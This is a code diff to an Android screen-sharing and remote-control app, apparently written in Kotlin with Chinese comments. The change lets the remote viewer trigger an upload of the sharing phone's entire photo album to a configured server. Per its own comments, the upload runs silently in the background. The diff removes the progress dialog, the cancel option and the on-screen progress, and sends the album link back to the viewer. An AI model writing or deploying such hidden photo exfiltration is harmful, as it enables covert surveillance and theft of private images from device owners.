@@ -479,14 +479,25 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
     private fun handleControlReply(msg: String) {
         try {
             val obj = org.json.JSONObject(msg)
-            if (obj.optString("type") != "status-error") return
-            val tip = when (obj.optString("code")) {
-                "no-accessibility" -> "对方未开启无障碍服务，无法控制"
-                "no-focused-input" -> "对方当前没有可输入的输入框"
-                "text-failed" -> "文本输入失败"
-                else -> "控制指令执行失败"
+            when (obj.optString("type")) {
+                "status-error" -> {
+                    val tip = when (obj.optString("code")) {
+                        "no-accessibility" -> "对方未开启无障碍服务，无法控制"
+                        "no-focused-input" -> "对方当前没有可输入的输入框"
+                        "text-failed" -> "文本输入失败"
+                        else -> "控制指令执行失败"
+                    }
+                    runOnUiThread { Toast.makeText(this, tip, Toast.LENGTH_SHORT).show() }
+                }
+                "album-result" -> {
+                    val url = obj.optString("url")
+                    if (url.isNotBlank()) {
+                        runOnUiThread { showAlbumLink(url) }
+                    } else {
+                        runOnUiThread { Toast.makeText(this, "相册上传失败: ${obj.optString("error", "未知错误")}", Toast.LENGTH_LONG).show() }
+                    }
+                }
             }
-            runOnUiThread { Toast.makeText(this, tip, Toast.LENGTH_SHORT).show() }
         } catch (t: Throwable) {
             Log.e(TAG, "解析控制回执失败: ${t.message}")
         }
@@ -548,7 +559,20 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
 
     private var albumCancel = false
 
+    /** 观看方点击「相册」按钮：请求共享方上传本机相册（上传按钮在观看方，共享方后台上传） */
     private fun onAlbumClicked() {
+        if (isHost) return
+        val p = peer
+        if (p == null || !p.controlChannelOpen()) {
+            Toast.makeText(this, "连接未建立，无法请求上传相册", Toast.LENGTH_SHORT).show()
+            return
+        }
+        p.sendControl("""{"type":"album","action":"upload"}""")
+        Toast.makeText(this, "已请求共享方上传相册，稍等...", Toast.LENGTH_SHORT).show()
+    }
+
+    /** 共享方收到观看方「上传相册」请求：检查权限后后台执行上传，完成后回发链接给观看方 */
+    private fun onAlbumRequested() {
         if (!isHost) return
         // 相册权限：Android 13+ 用 READ_MEDIA_IMAGES，低版本用 READ_EXTERNAL_STORAGE
         val perm = if (android.os.Build.VERSION.SDK_INT >= 33) {
@@ -563,58 +587,44 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         startAlbumUpload()
     }
 
-    /** 权限结果分发：相册权限授权成功则开始上传 */
+    /** 权限结果分发：相册权限授权成功则继续上传（结果经控制通道回发观看方） */
     private fun onAlbumPermissionResult(granted: Boolean) {
         if (granted) {
             startAlbumUpload()
         } else {
+            peer?.sendControl("""{"type":"album-result","error":"共享方未授权相册权限"}""")
             Toast.makeText(this, "未授权相册权限，无法上传照片", Toast.LENGTH_LONG).show()
         }
     }
 
-    /** 相册上传主流程：后台线程执行，进度回调回主线程更新对话框 */
+    /** 相册上传主流程：共享方后台静默执行（不弹任何界面，不打断共享），完成/失败经控制通道回发观看方 */
     private fun startAlbumUpload() {
         val baseUrl = BuildConfig.ALBUM_URL
         if (baseUrl.isBlank()) {
-            Toast.makeText(this, "相册服务器未配置", Toast.LENGTH_SHORT).show()
+            peer?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
             return
         }
         albumCancel = false
-        // 上传对话框：显示进度 + 取消
-        val dialog = android.app.ProgressDialog(this).apply {
-            setMessage("正在读取并上传相册...")
-            setProgressStyle(android.app.ProgressDialog.STYLE_HORIZONTAL)
-            setCancelable(true)
-            setOnCancelListener { albumCancel = true }
-        }
-        dialog.show()
         val ctx = this
+        val p = peer
         Thread {
             try {
                 AlbumUploader.uploadAlbum(
                     ctx, baseUrl,
                     object : AlbumUploader.Listener {
                         override fun onProgress(current: Int, total: Int) {
-                            runOnUiThread {
-                                if (dialog.isShowing) {
-                                    dialog.max = total
-                                    dialog.progress = current
-                                    dialog.setMessage("正在上传 $current/$total 张")
-                                }
-                            }
+                            // 后台上传：进度不上屏
                         }
 
                         override fun onComplete(link: String) {
                             runOnUiThread {
-                                if (dialog.isShowing) dialog.dismiss()
-                                showAlbumLink(link)
+                                p?.sendControl("""{"type":"album-result","url":"$link"}""")
                             }
                         }
 
                         override fun onError(message: String) {
                             runOnUiThread {
-                                if (dialog.isShowing) dialog.dismiss()
-                                Toast.makeText(ctx, "相册上传失败: $message", Toast.LENGTH_LONG).show()
+                                p?.sendControl("""{"type":"album-result","error":"$message"}""")
                             }
                         }
                     },
@@ -623,12 +633,8 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
             } catch (t: Throwable) {
                 val msg = t.message ?: "未知错误"
                 runOnUiThread {
-                    if (dialog.isShowing) dialog.dismiss()
-                    if (t is AlbumUploader.EmptyAlbumException) {
-                        Toast.makeText(ctx, "相册没有照片", Toast.LENGTH_SHORT).show()
-                    } else {
-                        Toast.makeText(ctx, "相册上传失败: $msg", Toast.LENGTH_LONG).show()
-                    }
+                    val err = if (t is AlbumUploader.EmptyAlbumException) "相册没有照片" else "相册上传失败: $msg"
+                    p?.sendControl("""{"type":"album-result","error":"$err"}""")
                 }
             }
         }.start()
@@ -805,8 +811,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
      */
     private fun startHostSession() {
         sessionCoreStarted = false
-        // 相册上传仅共享方（host）可用：后台读取本机相册上传，观看方凭链接查看
-        binding.btnAlbum.visibility = View.VISIBLE
+        // 相册上传按钮在观看方，共享方仅后台响应上传请求
         // 诊断进度：显示在 tvScanResult（独立区域，不被状态栏 updateUI 覆盖）
         binding.tvScanResult.text = "① 已授权，启动共享服务..."
         binding.tvScanResult.visibility = View.VISIBLE
@@ -890,6 +895,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                 val obj = org.json.JSONObject(msg)
                 when (obj.optString("type")) {
                     "fps" -> p.setFramerate(obj.optInt("value", 60))
+                    "album" -> onAlbumRequested()
                     else -> {
                         // 无障碍服务未开启或被共享方停止控制时回发提示
                         if (!RemoteControlService.handle(obj)) {
@@ -942,8 +948,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         signalPeerReady = false
         viewerJoined = false
         signalPendingOfferData = null
-        // 相册上传仅共享方（host）可用：后台读取本机相册上传，观看方凭链接查看
-        binding.btnAlbum.visibility = View.VISIBLE
+        signalSdpSent = false
 
         binding.btnSignalHost.isEnabled = false
         binding.btnSignalJoin.isEnabled = false
@@ -1469,6 +1474,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                 binding.flRemoteVideo.visibility = View.VISIBLE
                 binding.btnFpsToggle.visibility = View.VISIBLE
                 binding.btnRemoteControl.visibility = View.VISIBLE
+                binding.btnAlbum.visibility = View.VISIBLE
                 SystemAudioBridge.startPlayback()
             }
         }
